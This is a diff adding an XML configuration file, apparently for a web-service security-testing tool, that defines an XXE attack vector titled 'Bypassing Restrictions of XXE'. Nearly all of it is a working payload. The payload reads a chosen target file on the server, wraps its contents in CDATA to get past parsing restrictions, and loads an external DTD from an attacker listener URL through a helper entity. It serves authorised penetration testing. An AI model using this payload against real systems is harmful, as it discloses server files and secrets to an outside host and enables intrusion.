@@ -1,0 +1,25 @@
+<config>
+<name>Bypassing Restrictions of XXE</name>
+<description>...</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>true</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+</params>
+<attackvectors>
+<attackvector>
+<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "§tf_targetFILE§">
+<!ENTITY % end "]]]]><![CDATA[>">
+<!ENTITY % dtd SYSTEM "§tf_listenURL§">
+%dtd;
+]>
+<data>&all;</data>]]></directMessage>
+<helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
+</attackvector>
+</attackvectors>
+</config>
